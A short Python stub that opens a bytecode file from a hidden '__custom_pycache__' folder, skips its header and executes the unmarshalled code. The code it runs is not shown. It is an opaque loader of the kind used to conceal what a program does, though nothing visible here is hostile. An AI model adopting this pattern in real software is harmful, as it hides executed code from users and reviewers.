
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'auxiliary_cd00ea2eecdd4f3787cccb30aac0fa87.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
